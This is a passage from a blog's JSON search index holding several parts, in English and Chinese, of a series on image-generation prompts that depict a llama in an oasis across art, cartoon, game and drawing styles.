Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示工程的藝術 - 藝術風格第 6 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6-zh-TW","date":"un00fin00","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-6/","excerpt":"扭曲現實,穿越未來!從超現實主義到蒸汽龐克,從故障藝術到霓虹風格,用 AI 創造夢境與未來的奇幻融合。","text":"這是第 5 部分的延續。 夢境 故障藝術 提示：故障藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 奇幻寫實主義 提示：奇幻寫實主義風格。綠洲中的羊駝 超現實主義 提示：超現實主義風格。綠洲中的羊駝 在這裡，平凡變得非凡，扭曲現實以創造我們的羊駝及其綠洲的奇幻版本。 未來 另類現代藝術 提示：另類現代藝術風格。綠洲中的羊駝 未來主義 提示：未來主義風格。綠洲中的羊駝 復古未來主義 提示：復古未來主義風格。綠洲中的羊駝 蒸汽龐克 提示：蒸汽龐克風格。綠洲中的羊駝 霓虹 提示：霓虹風格。綠洲中的羊駝 繼續到第 7 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"The Art of Prompt Engineering - Art Style Part 5","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5","date":"un66fin66","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5/","excerpt":"Master watercolor and oil painting techniques! From Shan Shui to sponging, explore wet-on-dry, blooming, and more styles to create dreamy, ethereal artwork with AI.","text":"This is a continuation of part 4. Watercolor and Oil Painting Shan Shui Painting Prompt: Shan shui painting on aged paper. simple. abstract. minimalist. light stroke. black and white. heavily washed. a lone llama in an oasis inside a wild desert. Oil Painting Prompt: Oil painting style. a llama in an oasis Rich textures and vibrant colors bring the scene to life with a touch of classic artistry. Water Paint With Sponging Technique Prompt: Water Paint With Sponging Technique. a lone llama in an oasis inside a wild desert. The image is characterized by bold, textured brushstrokes that create a soft, blended effect, as if gently squeezing a sponge to release color onto the paper. Water Paint Blooming Prompt: Water Paint Blooming. a lone llama in an oasis inside a wild desert. Loose Watercolor Paint Prompt: Loose Water Color Paint. a lone llama in an oasis inside a wild desert. Water Paint Blooming’s drawing style is a whimsical and dreamy mix of loose, expressive brushstrokes and delicate details that bring fantastical flowers to life on paper. Images generated with Loose Watercolor Paint are like a gentle stream, flowing freely with soft brushstrokes and subtle color blends that create a dreamy, ethereal quality. Pull In Color Paint Prompt: Pull In Color Paint. a lone llama in an oasis inside a wild desert. Pull-in-Color paint features a soft and gentle drawing style that resembles hand-painted watercolors, with delicate lines and subtle color gradations that give the impression of being drawn with a wet brush. Wet On Dry Paint Prompt: Wet On Dry Paint. a lone llama in an oasis inside a wild desert. The painting involves creating layers of transparent washes on a dry surface, allowing each layer to blend and merge with the previous one, resulting in soft, dreamy, and nuanced colors. This results in vertical strokes in the generated image. Flat Wash Paint Prompt: Flat Wash Paint. a lone llama in an oasis inside a wild desert. The generated image is a flat wash painting scene of a desert oasis while the llama remains sharp. Continue to part 6","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示工程的藝術 - 藝術風格第 5 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5-zh-TW","date":"un66fin66","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5/","excerpt":"掌握水彩與油畫的精髓!從山水畫到海綿技法,探索濕乾繪畫、暈染等多種風格,創造夢幻空靈的藝術作品。","text":"這是第 4 部分的延續。 水彩和油畫 山水畫 提示：陳舊紙張上的山水畫。簡單。抽象。極簡主義。輕筆觸。黑白。大量水洗。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 油畫 提示：油畫風格。綠洲中的羊駝 豐富的質感和鮮豔的色彩以經典藝術的觸感使場景栩栩如生。 海綿技法水彩畫 提示：海綿技法水彩畫。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 圖像的特點是大膽、有質感的筆觸，創造出柔和、混合的效果，就像輕輕擠壓海綿將顏色釋放到紙上。 水彩暈染 提示：水彩暈染。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 鬆散水彩畫 提示：鬆散水彩畫。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 水彩暈染的繪畫風格是鬆散、富有表現力的筆觸和精緻細節的異想天開和夢幻混合，使奇幻的花朵在紙上栩栩如生。 使用鬆散水彩畫產生的圖像就像溫柔的溪流，以柔和的筆觸和微妙的色彩混合自由流動，創造出夢幻、空靈的品質。 拉色繪畫 提示：拉色繪畫。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 拉色繪畫具有柔和溫和的繪畫風格，類似於手繪水彩，具有精緻的線條和微妙的色彩漸變，給人以濕筆繪製的印象。 濕乾繪畫 提示：濕乾繪畫。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 這種繪畫涉及在乾燥表面上創建透明水洗層，允許每層與前一層混合和融合，產生柔和、夢幻和細緻的色彩。這導致產生的圖像中出現垂直筆觸。 平塗繪畫 提示：平塗繪畫。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 產生的圖像是沙漠綠洲的平塗繪畫場景，而羊駝保持清晰。 繼續到第 6 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"提示工程的艺术 - 艺术风格第 5 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5-zh-CN","date":"un66fin66","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-5/","excerpt":"掌握水彩与油画的精髓!从山水画到海绵技法,探索湿干绘画、晕染等多种风格,创造梦幻空灵的艺术作品。","text":"这是第 4 部分的延续。 水彩和油画 山水画 提示：陈旧纸张上的山水画。简单。抽象。极简主义。轻笔触。黑白。大量水洗。一只孤独的羊驼在荒野沙漠中的绿洲里。 油画 提示：油画风格。绿洲中的羊驼 丰富的质感和鲜艳的色彩以经典艺术的触感使场景栩栩如生。 海绵技法水彩画 提示：海绵技法水彩画。一只孤独的羊驼在荒野沙漠中的绿洲里。 图像的特点是大胆、有质感的笔触，创造出柔和、混合的效果，就像轻轻挤压海绵将颜色释放到纸上。 水彩晕染 提示：水彩晕染。一只孤独的羊驼在荒野沙漠中的绿洲里。 松散水彩画 提示：松散水彩画。一只孤独的羊驼在荒野沙漠中的绿洲里。 水彩晕染的绘画风格是松散、富有表现力的笔触和精致细节的异想天开和梦幻混合，使奇幻的花朵在纸上栩栩如生。 使用松散水彩画生成的图像就像温柔的溪流，以柔和的笔触和微妙的色彩混合自由流动，创造出梦幻、空灵的品质。 拉色绘画 提示：拉色绘画。一只孤独的羊驼在荒野沙漠中的绿洲里。 拉色绘画具有柔和温和的绘画风格，类似于手绘水彩，具有精致的线条和微妙的色彩渐变，给人以湿笔绘制的印象。 湿干绘画 提示：湿干绘画。一只孤独的羊驼在荒野沙漠中的绿洲里。 这种绘画涉及在干燥表面上创建透明水洗层，允许每层与前一层混合和融合，产生柔和、梦幻和细致的色彩。这导致生成的图像中出现垂直笔触。 平涂绘画 提示：平涂绘画。一只孤独的羊驼在荒野沙漠中的绿洲里。 生成的图像是沙漠绿洲的平涂绘画场景，而羊驼保持清晰。 继续到第 6 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"The Art of Prompt Engineering - Art Style Part 4","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4","date":"un55fin55","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4/","excerpt":"Transform llamas into beloved characters! From Miyazaki's whimsy to Pikachu's charm, explore cartoon and anime styles that blend iconic aesthetics with AI creativity.","text":"This is a continuation of part 3. Cartoon and Anime The image generated could potentially resemble copyrighted materials, so it’s essential to use caution when using these prompts. Cartoon Prompt: Cartoon style. a llama in an oasis Cartoon drawing style features characters and objects that look super silly, exaggerated, and colorful, with big eyes and funny faces. Comics Prompt: Comics style. a llama in an oasis American comics often feature a bold and dynamic drawing style with exaggerated features and bright colors that make characters look cool. Manga Prompt: Manga style. a llama in an oasis Bold lines and patterned shades bring characters to life. Chibi Drawing Prompt: Chibi Drawing style. a lone llama in an oasis inside a wild desert. Chibi drawings are super cute and simplified, with big eyes, tiny bodies, and exaggerated features that make characters look adorable and youthful. Hayao Miyazaki Art Prompt: Hayao Miyazaki Art style. a lone llama in an oasis inside a wild desert. Hayao Miyazaki’s drawing style is known for its whimsical, dreamy, and fantastical quality, with intricate details, expressive characters, and a blend of traditional and modern techniques that create a sense of timeless wonder. Powerpuff Girls Prompt: Powerpuff Girls style. a lone llama in an oasis inside a wild desert. It looks like Powerpuff Girls’ eyes have been pasted onto a llama. Dora Cartoon Prompt: Dora Cartoon style. a lone llama in an oasis inside a wild desert. It looks like Dora’s head has been pasted onto a llama. My Little Pony Cartoon Prompt: My Little Pony Cartoon style. a lone llama in an oasis inside a wild desert. Is this a llama with too much hair? The Simpsons Prompt: The Simpsons style. a lone llama in an oasis inside a wild desert. Pikachu Prompt: Pikachu style. a lone llama in an oasis inside a wild desert. Pikachu Cartoon Prompt: Pikachu cartoon style. a lone llama in an oasis inside a wild desert. Hello Kitty Cartoon Prompt: Hello Kitty Cartoon style. a lone llama in an oasis inside a wild desert. It looks like Hello Kitty’s head has been pasted onto a llama. Continue to part 5","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示工程的艺术 - 艺术风格第 4 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4-zh-CN","date":"un55fin55","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4/","excerpt":"从宫崎骏到皮卡丘,卡通与动漫风格如何将羊驼变成可爱的艺术符号。","text":"这是第 3 部分的延续。 卡通和动漫 生成的图像可能与受版权保护的材料相似，因此在使用这些提示时必须谨慎。 卡通 提示：卡通风格。绿洲中的羊驼 卡通绘画风格的特点是角色和物体看起来超级愚蠢、夸张和色彩丰富，有大眼睛和有趣的脸。 漫画 提示：漫画风格。绿洲中的羊驼 美国漫画通常具有大胆和动态的绘画风格，具有夸张的特征和明亮的色彩，使角色看起来很酷。 日本漫画 提示：日本漫画风格。绿洲中的羊驼 大胆的线条和图案阴影使角色栩栩如生。 Q 版绘画 提示：Q 版绘画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 Q 版绘画超级可爱和简化，有大眼睛、小身体和夸张的特征，使角色看起来可爱和年轻。 宫崎骏艺术 提示：宫崎骏艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 宫崎骏的绘画风格以其异想天开、梦幻和奇幻的品质而闻名，具有复杂的细节、富有表现力的角色，以及传统和现代技术的融合，创造出永恒奇迹的感觉。 飞天小女警 提示：飞天小女警风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 看起来像飞天小女警的眼睛被贴到羊驼上。 朵拉卡通 提示：朵拉卡通风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 看起来像朵拉的头被贴到羊驼上。 彩虹小马卡通 提示：彩虹小马卡通风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 这是一只头发太多的羊驼吗？ 辛普森一家 提示：辛普森一家风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 皮卡丘 提示：皮卡丘风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 皮卡丘卡通 提示：皮卡丘卡通风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 Hello Kitty 卡通 提示：Hello Kitty 卡通风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 看起来像 Hello Kitty 的头被贴到羊驼上。 继续到第 5 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"提示工程的藝術 - 藝術風格第 4 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4-zh-TW","date":"un55fin55","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-4/","excerpt":"從宮崎駿到皮卡丘,卡通與動漫風格如何將羊駝變成可愛的藝術符號。","text":"這是第 3 部分的延續。 卡通和動漫 產生的圖像可能與受版權保護的材料相似，因此在使用這些提示時必須謹慎。 卡通 提示：卡通風格。綠洲中的羊駝 卡通繪畫風格的特點是角色和物體看起來超級愚蠢、誇張和色彩豐富，有大眼睛和有趣的臉。 漫畫 提示：漫畫風格。綠洲中的羊駝 美國漫畫通常具有大膽和動態的繪畫風格，具有誇張的特徵和明亮的色彩，使角色看起來很酷。 日本漫畫 提示：日本漫畫風格。綠洲中的羊駝 大膽的線條和圖案陰影使角色栩栩如生。 Q 版繪畫 提示：Q 版繪畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 Q 版繪畫超級可愛和簡化，有大眼睛、小身體和誇張的特徵，使角色看起來可愛和年輕。 宮崎駿藝術 提示：宮崎駿藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 宮崎駿的繪畫風格以其異想天開、夢幻和奇幻的品質而聞名，具有複雜的細節、富有表現力的角色，以及傳統和現代技術的融合，創造出永恆奇蹟的感覺。 飛天小女警 提示：飛天小女警風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 看起來像飛天小女警的眼睛被貼到羊駝上。 朵拉卡通 提示：朵拉卡通風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 看起來像朵拉的頭被貼到羊駝上。 彩虹小馬卡通 提示：彩虹小馬卡通風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 這是一隻頭髮太多的羊駝嗎？ 辛普森家庭 提示：辛普森家庭風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 皮卡丘 提示：皮卡丘風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 皮卡丘卡通 提示：皮卡丘卡通風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 Hello Kitty 卡通 提示：Hello Kitty 卡通風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 看起來像 Hello Kitty 的頭被貼到羊駝上。 繼續到第 5 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"The Art of Prompt Engineering - Art Style Part 3","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3","date":"un44fin44","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3/","excerpt":"Master the fundamentals: from trois crayon to line art, discover how traditional drawing techniques shape a llama through the power of pen and pencil.","text":"This is a continuation of part 2. This page focuses on various drawing techniques. Techniques with Pens Trois Crayon Prompt: Trois Crayon style. a lone llama in an oasis inside a wild desert. The Trois Crayon drawing style is characterized by bold, expressive lines and vibrant colors. Ink Prompt: Ink style. a lone llama in an oasis inside a wild desert. Ink pen drawing involves using liquid ink flowing from a small tip to create bold and expressive lines. Wash and Ink Drawing Prompt: Wash and Ink style. a lone llama in an oasis inside a wild desert. Washy lines with gentle ink strokes create soft, dreamy scenes that look like they’re floating on water. Academic Drawing Prompt: Academic Drawing style. a lone llama in an oasis inside a wild desert. Academic Drawing is a style that uses precise lines and careful shading to show what something looks like in a very realistic way. Doodling Prompt: Doodling style. a lone llama in an oasis inside a wild desert. “Doodling” means making quick and playful drawings with simple lines and shapes that are easy to create and don’t need to be perfect. Sometimes, it becomes perfect. Pencil Drawing Prompt: Pencil Drawing style. a lone llama in an oasis inside a wild desert. Pencil drawing is a way to create art using thin lines and soft marks made with a pencil, giving the picture a gentle and delicate look. Simple Pen Drawing Prompt: Simple Pen Drawing style. a lone llama in an oasis inside a wild desert. Simple pencil drawings have less shading and softer marks. Simple Colored Pencil Drawing Prompt: Simple Colored Pencil Drawing style. a lone llama in an oasis inside a wild desert. Colored pencil drawings are a way to create art using thin lines and soft marks made with colored pencils, giving the picture a gentle and delicate look. Sketching Prompt: Sketching style. a lone llama in an oasis inside a wild desert. Sketching is a way to draw quick and simple pictures using soft lines and gentle strokes that help bring out the main shapes and features. Line Art Prompt: Line Art style. a lone llama in an oasis inside a wild desert. Line art is the process of creating an outline. Outline Prompt: Outline. a lone llama in an oasis inside a wild desert. Line Art Contour Drawing Prompt: Line Art Contour Drawing style. a lone llama in an oasis inside a wild desert. Line Art Contour Drawing is a style where bold lines and shapes show the edges and outlines of subjects in layers. Continue to part 4","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[]},{"title":"提示工程的艺术 - 艺术风格第 3 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3-zh-CN","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3/","excerpt":"从三色粉笔到线条艺术,掌握各种绘画技术如何用笔触塑造羊驼的形态。","text":"这是第 2 部分的延续。 本页专注于各种绘画技术。 使用笔的技术 三色粉笔 提示：三色粉笔风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 三色粉笔绘画风格的特点是大胆、富有表现力的线条和鲜艳的色彩。 墨水 提示：墨水风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 墨水笔绘画涉及使用从小笔尖流出的液体墨水来创建大胆和富有表现力的线条。 水墨画 提示：水墨画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 水洗线条和温柔的墨水笔触创造出柔和、梦幻的场景，看起来像漂浮在水面上。 学院派绘画 提示：学院派绘画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 学院派绘画是一种使用精确线条和仔细阴影以非常写实的方式展示事物外观的风格。 涂鸦 提示：涂鸦风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 &quot;涂鸦&quot;意味着用简单的线条和形状制作快速而有趣的绘画，这些绘画易于创建且不需要完美。有时，它会变得完美。 铅笔绘画 提示：铅笔绘画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 铅笔绘画是一种使用铅笔制作的细线和柔和标记来创作艺术的方式，使图片具有温柔和精致的外观。 简单笔绘画 提示：简单笔绘画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 简单的铅笔绘画具有较少的阴影和更柔和的标记。 简单彩色铅笔绘画 提示：简单彩色铅笔绘画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 彩色铅笔绘画是一种使用彩色铅笔制作的细线和柔和标记来创作艺术的方式，使图片具有温柔和精致的外观。 素描 提示：素描风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 素描是一种使用柔和的线条和温柔的笔触绘制快速简单图片的方式，有助于突出主要形状和特征。 线条艺术 提示：线条艺术风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 线条艺术是创建轮廓的过程。 轮廓 提示：轮廓。一只孤独的羊驼在荒野沙漠中的绿洲里。 线条艺术轮廓绘画 提示：线条艺术轮廓绘画风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 线条艺术轮廓绘画是一种风格，其中大胆的线条和形状以层次显示主题的边缘和轮廓。 继续到第 4 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-CN"},{"title":"提示工程的藝術 - 藝術風格第 3 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3-zh-TW","date":"un44fin44","updated":"un66fin66","comments":true,"path":"/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3/","permalink":"https://neo01.com/zh-TW/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-3/","excerpt":"從三色粉筆到線條藝術,掌握各種繪畫技術如何用筆觸塑造羊駝的形態。","text":"這是第 2 部分的延續。 本頁專注於各種繪畫技術。 使用筆的技術 三色粉筆 提示：三色粉筆風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 三色粉筆繪畫風格的特點是大膽、富有表現力的線條和鮮豔的色彩。 墨水 提示：墨水風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 墨水筆繪畫涉及使用從小筆尖流出的液體墨水來創建大膽和富有表現力的線條。 水墨畫 提示：水墨畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 水洗線條和溫柔的墨水筆觸創造出柔和、夢幻的場景，看起來像漂浮在水面上。 學院派繪畫 提示：學院派繪畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 學院派繪畫是一種使用精確線條和仔細陰影以非常寫實的方式展示事物外觀的風格。 塗鴉 提示：塗鴉風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 「塗鴉」意味著用簡單的線條和形狀製作快速而有趣的繪畫，這些繪畫易於創建且不需要完美。有時，它會變得完美。 鉛筆繪畫 提示：鉛筆繪畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 鉛筆繪畫是一種使用鉛筆製作的細線和柔和標記來創作藝術的方式，使圖片具有溫柔和精緻的外觀。 簡單筆繪畫 提示：簡單筆繪畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 簡單的鉛筆繪畫具有較少的陰影和更柔和的標記。 簡單彩色鉛筆繪畫 提示：簡單彩色鉛筆繪畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 彩色鉛筆繪畫是一種使用彩色鉛筆製作的細線和柔和標記來創作藝術的方式，使圖片具有溫柔和精緻的外觀。 素描 提示：素描風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 素描是一種使用柔和的線條和溫柔的筆觸繪製快速簡單圖片的方式，有助於突出主要形狀和特徵。 線條藝術 提示：線條藝術風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 線條藝術是創建輪廓的過程。 輪廓 提示：輪廓。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 線條藝術輪廓繪畫 提示：線條藝術輪廓繪畫風格。一隻孤獨的羊駝在荒野沙漠中的綠洲裡。 線條藝術輪廓繪畫是一種風格，其中大膽的線條和形狀以層次顯示主題的邊緣和輪廓。 繼續到第 4 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[],"lang":"zh-TW"},{"title":"提示工程的艺术 - 艺术风格第 2 部分","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2-zh-CN","date":"un33fin33","updated":"un66fin66","comments":true,"path":"/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2/","permalink":"https://neo01.com/zh-CN/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2/","excerpt":"从星露谷物语到赛博朋克,游戏美学与电影技术如何重塑羊驼的数字形象。","text":"这是第 1 部分的延续。 游戏 这不完全是一种艺术风格，但各种电子游戏中的图形对图像生成有很大的影响。 星露谷物语 提示：PC 游戏星露谷物语风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 游戏的复古美学具有充满活力的 8 位元灵感艺术风格，具有大胆、实心的像素和明确的边缘。 空洞骑士 提示：PC 游戏空洞骑士风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 游戏的艺术风格非常突出。一幅令人毛骨悚然的美丽插图，描绘了一个神秘的古老森林，扭曲的树枝像骨骼般的手指伸向月亮，周围环绕着诡异的薄雾和发光的真菌生长。 赛博朋克 提示：赛博朋克风格。绿洲中的羊驼 黑暗、霓虹浸染的赛博朋克景观和角色，具有粗糙的工业质感和脉动的电路，将传统科幻元素与粗糙的城市衰败融合在一起。 Minecraft 提示：Minecraft 风格。绿洲中的羊驼 Minecraft 的方块状、低多边形美学具有简单、厚实的 3D 模型和充满活力的纹理，专注于大地色调和微妙的光照效果，使其奇幻世界栩栩如生。 俄罗斯方块 提示：俄罗斯方块风格。绿洲中的羊驼 俄罗斯方块标志性的基于方块的美学具有简单的单色配色方案，具有几何形状和干净的线条，创造了一个极简但迷人的视觉识别，经受住了时间的考验。 数字 像素艺术 提示：像素艺术风格。绿洲中的羊驼 图像提供了一种复古的数字美学，让人想起早期的电子游戏。 电影 鸟瞰视角 提示：鸟瞰视角。一只孤独的羊驼在荒野沙漠中的绿洲里。 充满活力的视觉效果从鸟瞰角度描绘了一个郁郁葱葱、异想天开的世界，具有复杂的细节和柔和的阴影，创造了一种身临其境的体验。 特写 提示：特写。一只孤独的羊驼在荒野沙漠中的绿洲里。 一种摄影风格，放大细节，以惊人的亲密感捕捉复杂的纹理、微妙的表情和微小的特征。 头部特写大鼻子鱼眼镜头 提示：头部特写大鼻子鱼眼镜头。一只孤独的羊驼在荒野沙漠中的绿洲里。 近距离拍摄的鱼眼镜头肖像会产生一个大鼻子和可爱的图像，散发出可爱和亲密感。 变形 提示：变形风格。一只孤独的羊驼在荒野沙漠中的绿洲里。 一种电影技术，水平压缩图像，创造出独特、扭曲的视角，具有夸张的边缘和深度线索，通常用于电影和电视节目中，以创造怀旧或复古的美学。 继续到第 3 部分","categories":[{"name":"AI","slug":"AI","permalink":"https://neo01.com/categories/AI/"},{"name":"Art Gallery","slug":"AI/Art-Gallery","permalink":"https://neo01.com/categories/AI/Art-Gallery/"}],"tags":[{"name":"Minecraft","slug":"Minecraft","permalink":"https://neo01.com/tags/Minecraft/"}],"lang":"zh-CN"},{"title":"The Art of Prompt Engineering - Art Style Part 2","slug":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2","date":"un33fin33","updated":"un66fin66","comments":true,"path":"2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2/","permalink":"https://neo01.com/2024/06/The-Art-Of-Prompt-Engineering-Art-Style-Part-2/","excerpt":"From Stardew Valley to cyberpunk, explore how video game aesthetics and cinematic techniques transform a simple llama into digital art across genres.","text":"This is a continuation of part 1. Game This is not exactly an art style, but graphics in various video games have a great influence on image generation. Stardew Valley Prompt: PC Game Stardew Valley style. a lone llama in an oasis inside a wild desert. The game’s retro aesthetic features a vibrant, 8-bit inspired art style, with bold, solid pixels and defined edges. Hollow Knight Prompt: PC Game Hollow Knight style. a lone llama in an oasis inside a wild desert. The game’s art style stands out significantly. A hauntingly beautiful illustration of a mysterious, ancient forest, with gnarled tree branches stretching towards the moon like skeletal fingers, surrounded by a halo of eerie mist and glowing fungal growths. Cyberpunk Prompt: Cyberpunk style. a llama in an oasis Dark, neon-drenched cyberpunk landscapes and characters, with gritty, industrial textures and pulsing circuitry, blend traditional sci-fi elements with gritty urban decay. Minecraft Prompt: Minecraft style. a llama in an oasis Minecraft’s blocky, low-poly aesthetic features simple, chunky 3D models and vibrant textures, with a focus on earthy tones and subtle lighting effects that bring its fantastical worlds to life. Tetris Prompt: Tetris style. a llama in an oasis Tetris’s iconic block-based aesthetic features a simple, monochromatic color scheme with geometric shapes and clean lines, creating a minimalist yet mesmerizing visual identity that has stood the test of time. Digital Pixel Art Prompt: Pixel art style. a llama in an oasis The image offers a retro, digital aesthetic reminiscent of early video games. Cinematic Bird’s-Eye View Prompt: Bird’s-Eye View. a lone llama in an oasis inside a wild desert. Vibrant visuals depict a lush, whimsical world from a bird’s-eye perspective, with intricate details and soft shading creating an immersive experience. Close-Up Prompt: Close-Up. a lone llama in an oasis inside a wild desert. A photographic style that zooms in on the details, capturing intricate textures, subtle expressions, and minute features with striking intimacy. Head Close-Up Big Nose Fisheye Shot Prompt: Head Close-Up Big Nose Fisheye Shot. a lone llama in an oasis inside a wild desert. A 